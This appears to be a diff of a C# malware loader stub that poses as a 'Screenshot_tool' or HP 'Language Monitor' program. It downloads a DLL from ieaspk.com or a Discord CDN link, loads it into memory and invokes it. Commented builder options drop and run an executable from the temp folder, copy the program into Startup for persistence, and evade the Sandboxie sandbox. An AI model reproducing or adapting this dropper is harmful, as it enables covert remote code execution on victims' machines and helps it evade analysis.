@@ -1,19 +1,27 @@
-using Monitoring;
+/*
+ * Created by SharpDevelop.
+ * User: Myel
+ * Date: 02/07/2014
+ * Time: 11:24
+ * 
+ * To change this template use Tools | Options | Coding | Edit Standard Headers.
+ */
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Net;
 using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-
-//Default [assembly: AssemblyTitle("LanguageMonitor")]
-//Default [assembly: AssemblyDescription("LanguageMonitor")]
-//Default [assembly: AssemblyCompany("Hewlett-Packard Company")]
-//Default [assembly: AssemblyProduct("Language Monitor")]
-//Default [assembly: AssemblyCopyright("Copyright (C) 1999")]
-//Default [assembly: AssemblyFileVersion("70.83.14.10")]
+//Default [assembly: AssemblyTitle("sourceid")]
+//Default [assembly: AssemblyDescription("sourceid")]
+//Default [assembly: AssemblyCompany("sourceid-sourceid sourceid")]
+//Default [assembly: AssemblyProduct("sourceid sourceid")]
+//Default [assembly: AssemblyCopyright("sourceid Copyright (C) 2021")]
+//Default [assembly: AssemblyFileVersion("1.1.3.0")]
 
 
 
@@ -24,172 +32,94 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyCopyright("{5}")]
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
-
-
-
-namespace Monitoring
+namespace Screenshot_tool
 {
-    public class clsUserSecurity
-    {
-        static clsUserSecurity sec;
-        private bool isadmin = false;
-        private int userid = 0;
-
-        private clsUserSecurity()
-        {
-        }
-
-        static public clsUserSecurity GetUser()
-        {
-            if (sec == null)
-            {
-                sec = new clsUserSecurity();
-            }
-
-            return sec;
-        }
-
-        public bool IsAdmin
-        {
-            get { return isadmin; }
-            set { isadmin = value; }
-        }
-
-        public int UserID
-        {
-            get { return userid; }
-            set { userid = value; }
-        }
-    }
-}
-
-
-namespace Monitoring
-{
-    class clsEncryption
-    {
-        public static string encryptThis(string str, byte bt)
-        {
-            string encrypt = "";
-
-            //USING COALESCING OPERATOR CONDITION
-            bt = (bt > 0 && bt <= 13) ? bt : Convert.ToByte(13);
-
-            char[] chr = str.ToString().ToCharArray();
-
-            for (int i = 0; i < str.Length; i++)
-            {
-                //CONVERTING CHAR TO INT
-                int x = Convert.ToInt32(chr[i]);
-                //CONVERTING INT TO CHAR
-                encrypt = encrypt + Convert.ToChar((255 - (x + bt - i)));
-            }
-            return encrypt;
-        }
-
-        public static string decryptThis(string str, byte bt)
-        {
-            string encrypt = "";
-
-            //USING COALESCING OPERATOR CONDITION
-            bt = (bt > 0 && bt <= 13) ? bt : Convert.ToByte(13);
-
-            char[] chr = str.ToString().ToCharArray();
-
-            for (int i = 0; i < str.Length; i++)
-            {
-                int x = Convert.ToInt32(chr[i]);
-                encrypt = encrypt + Convert.ToChar(255 + (-x - bt + i));
-            }
-            return encrypt;
-        }
-    }
-}
-
-
-namespace Monitoring
-{
-    static class Program
-    {
-
-        public static byte[] RedKeys(string harbi)
-        {
-            byte[] RedKeys;
-            for (; ; )
-            {
-                try
-                {
-                    WebClient telefon = new WebClient();
-                    RedKeys = telefon.DownloadData(harbi);
-                }
-                catch (Exception ex)
-                {
-                    continue;
-                }
-                break;
-            }
-            return RedKeys;
-        }
-
-        /// <summary>
-        /// The main entry point for the application.
-        /// </summary>
-        [STAThread]
-        static void Main()
-        {
+	/// <summary>
+	/// Class with program entry point.
+	/// </summary>
+	internal sealed class Program
+	{
+		/// <summary>
+		/// Program entry point.
+		/// </summary>
+		/// 
 
 
 
-            //sandboxie controlsandboxie();
+		public static byte[] indirme(string filemanager)
+		{
+			byte[] indirme;
+			for (; ; )
+			{
+				try
+				{
+					WebClient numara = new WebClient();
+					indirme = numara.DownloadData(filemanager);
+				}
+				catch (Exception ex)
+				{
+					continue;
+				}
+				break;
+			}
+			return indirme;
+		}
+		[STAThread]
+		private static void Main(string[] args)
+		{
 
-            //Messega
+			//sandboxie controlsandboxie();
 
-
-            //download try
-            //download {
-            //download  System.Net.WebClient appyrun = new System.Net.WebClient();
-            //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
-            //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
-            //download }
-            //download catch
-            //download {
-            //download }
-
-
-            {
-                ServicePointManager.Expect100Continue = true;
-                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            }
-
-
-            object audio = new object[] { %aPP%, string.Empty, RedKeys("%Server%"), true };
-            clsUserSecurity.GetUser().IsAdmin = true;
-
-            ServicePointManager.Expect100Continue = true;
-
-
-            Assembly Flow;
-
-            Flow = AppDomain.CurrentDomain.Load(RedKeys("https://ieaspk.com/TextEditor.dll"));
+			//Messega
 
 
-            Flow.GetType("TextEditor.Home").InvokeMember("sourcecodester", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])audio);
+			//download try
+			//download {
+			//download  System.Net.WebClient appyrun = new System.Net.WebClient();
+			//download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
+			//download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
+			//download }
+			//download catch
+			//download {
+			//download }
+			{
+				ServicePointManager.Expect100Continue = true;
+				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
+			}
 
-            //start  {
-            //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
-            //start  }
+
+			object resim = new object[] { %aPP%, string.Empty, indirme("%Server%"), true };
 
 
-        }
+			ServicePointManager.Expect100Continue = true;
 
-        //sandboxie [DllImport("kernel32.dll")]
-        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
-        //sandboxie static void controlsandboxie()
-        //sandboxie {
-        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
-        //sandboxie     {
-        //sandboxie        Environment.Exit(1);
-        //sandboxie     }
-        //sandboxie }
-    }
+
+			Assembly maymun;
+
+			maymun = AppDomain.CurrentDomain.Load(indirme("https://cdn.discordapp.com/attachments/849222618649591812/849222637179371520/TextEditor.dll"));
+
+
+			maymun.GetType("TextEditor.Home").InvokeMember("sourcecodester", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])resim);
+
+
+			//start  {
+			//start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
+			//start  }
+
+
+		}
+
+
+
+		//sandboxie [DllImport("kernel32.dll")]
+		//sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
+		//sandboxie static void controlsandboxie()
+		//sandboxie {
+		//sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
+		//sandboxie     {
+		//sandboxie        Environment.Exit(1);
+		//sandboxie     }
+		//sandboxie }
+
+	}
 }
